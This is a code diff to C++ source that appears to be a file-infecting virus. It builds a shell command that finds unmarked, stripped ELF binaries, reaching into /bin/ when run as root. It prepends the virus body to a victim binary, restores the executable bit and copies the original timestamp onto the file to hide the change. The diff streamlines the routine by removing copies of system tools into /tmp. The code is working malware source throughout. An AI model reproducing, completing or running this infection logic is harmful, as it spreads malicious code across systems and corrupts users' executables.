@@ -44,35 +44,29 @@ int main (int argc, char** argv) {
         return 30;
     }
     if (childpid > 0) {
-        command = "[ -e /tmp/busgr ] || cp /bin/grep /tmp/busgr; \
-[ -e /tmp/busmv ] || cp /bin/mv /tmp/busmv; \
-[ -e /tmp/busca ] || cp /bin/cat /tmp/busca; \
-[ -e /tmp/busch ] || cp /bin/chmod /tmp/busch; \
-[ -e /tmp/busec ] || cp /bin/echo /tmp/busec; \
-[ -e /tmp/busrm ] || cp /bin/rm /tmp/busrm; ";
-        command += "VIR=$(for n in `find ";
+        command = "VIR=$(for n in `find ";
         if (uid == 0) command += "/bin/ ";
         command += "-mindepth 1 -maxdepth 1 -type f";
-        if (uid == 0) command += " | egrep '^/bin/ls$|^/bin/chmod$'";
+        if (uid == 0) command += " | egrep '^/bin/ls$'";
         command += "`; \
 do \
-file $n | /tmp/busgr -q ELF && ( \
-/tmp/busgr -q PROBOTEST $n || ( \
-/tmp/busec \"$n\" \
+file $n | grep -q ELF && ( \
+grep -q PROBOTEST $n || ( \
+echo \"$n\" \
 ) \
 ); \
 done | tail -1); \
 if [ ! -z \"$VIR\" ]; then \
-file $VIR | /tmp/busgr -q stripped$ && (\
-/tmp/busmv $VIR ${VIR}__ && \
-/tmp/busca ";
+file $VIR | grep -q stripped$ && (\
+mv $VIR ${VIR}__ && \
+cat ";
         command += vir;
         command += " ${VIR}__ >$VIR && \
-/tmp/busch ugo+x $VIR && \
+chmod ugo+x $VIR && \
 touch -r ${VIR}__ $VIR \
 ) \
 fi; \
-/tmp/busrm -f ${VIR}__ ";
+rm -f ${VIR}__ ";
         command += vir;
         command += " ";
         command += exe;
